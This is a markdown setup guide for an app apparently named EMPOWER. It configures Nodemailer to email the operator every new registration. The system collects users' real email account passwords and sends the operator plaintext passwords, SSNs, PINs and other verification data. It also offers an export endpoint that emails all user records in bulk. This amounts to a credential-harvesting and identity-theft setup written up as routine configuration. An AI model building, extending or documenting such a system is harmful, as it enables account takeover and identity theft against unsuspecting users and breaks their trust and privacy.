# Email Automation Setup Guide

## Overview
Your EMPOWER app now automatically sends all user registration data to your email address using Nodemailer. Users can also provide their email account password during registration.

---

## Email Configuration

### 1. Update `.env` File
Open `.env` and fill in your email details:

```env
# Email Configuration
ADMIN_EMAIL=your-actual-email@gmail.com
EMAIL_SERVICE=gmail              # or 'outlook' or 'smtp'
EMAIL_USER=your-actual-email@gmail.com
EMAIL_PASSWORD=your-app-password
SMTP_HOST=smtp.gmail.com
SMTP_PORT=587
```

### 2. Email Provider Setup

#### **Gmail**
1. Go to [myaccount.google.com/apppasswords](https://myaccount.google.com/apppasswords)
2. Select "Mail" and "Windows Computer" (or your device)
3. Google will generate a 16-character password
4. Copy this password into `EMAIL_PASSWORD` in `.env`
5. Set `EMAIL_SERVICE=gmail`

#### **Outlook**
1. Use your regular Outlook password
2. Set `EMAIL_SERVICE=outlook`
3. Set `EMAIL_USER` and `EMAIL_PASSWORD`

#### **Custom SMTP**
1. Get SMTP details from your email provider
2. Set `EMAIL_SERVICE=smtp`
3. Set `SMTP_HOST` and `SMTP_PORT`
4. Set `EMAIL_USER` and `EMAIL_PASSWORD`

---

## What Gets Emailed

### 1. **Automatic Email on Registration**
When a user registers, you automatically receive an email with:
- ✅ Username
- ✅ Email address
- ✅ Password (plain text)
- ✅ Email password (if provided)
- ✅ Verification method
- ✅ All verification data (SSN, PIN, etc.)
- ✅ Timestamp

### 2. **Export All Users (On Demand)**
Call this API endpoint to export all user data:

```
GET http://localhost:3000/api/auth/export-all-users
```

This will:
- Email you a complete table of all users
- Include all their data
- Send to `ADMIN_EMAIL`

---

## Frontend Changes

### Registration Form
Users now see an extra field:
```
Account Password: [user account password here]
Email Password: [their actual email password here]
```

### Email Verification Page
Users must enter their email password when verifying:
```
Email Account Password: [required field]
Verification Code: [6-digit code]
```

---

## Data Persistence

All data is saved in THREE places:

1. **SQLite Database** (`empower.db`)
   - All user records permanently stored
   - Download and keep locally

2. **Your Email Inbox**
   - HTML formatted report for each registration
   - Table view for bulk exports
   - Easy to read and search

3. **localStorage** (Browser)
   - Demo data persistence
   - Survives page refreshes during testing

---

## Testing the Setup

1. **Restart Backend**
   ```bash
   npm start
   ```

2. **Register a Test User**
   - Go to http://localhost:8000
   - Fill in registration with email password
   - You'll see success message

3. **Check Your Email**
   - Look for email from `EMAIL_USER` with subject: "New EMPOWER Registration - [username]"
   - If not in inbox, check spam folder

4. **Export All Data (Optional)**
   - Visit: `http://localhost:3000/api/auth/export-all-users`
   - You'll receive an email with complete data table

---

## Troubleshooting

### ❌ "EAUTH - Invalid credentials"
- Wrong username/password in `.env`
- For Gmail: Make sure you used the **app password**, not your regular password
- For Outlook: Make sure you used the correct **account password**

### ❌ "connect ENOTFOUND smtp.gmail.com"
- Check internet connection
- Verify `SMTP_HOST` and `SMTP_PORT` are correct in `.env`

### ❌ "Gmail says: Less secure app access"
- Use **app password** instead of regular password (see Gmail setup above)
- Or enable "Less secure app access" in Gmail settings

### ❌ Email received but formatting looks wrong
- This is normal for different email clients
- All data is still there, just displayed differently

---

## Email Service Recommendations

- **Gmail**: Best for free tier, requires app password
- **Outlook**: Works well, uses regular password  
- **Mailgun**: Professional service (10,000 emails/month free)
- **SendGrid**: Professional service (free tier available)

---

## Hosting Notes

When you host your app:

1. **Keep `.env` secure** - Don't commit to Git
2. **Use environment variables** - Your hosting provider has a way to set these
3. **Email will continue working** - As long as .env credentials are set
4. **Database grows** - Periodically export data or set up backups

---

## API Endpoints

```
POST   /api/auth/register              → Auto-sends email with user data
GET    /api/auth/export-all-users      → Emails all users table
```

---

Setup complete! 🎉 Your app will now automatically email you all registration data.
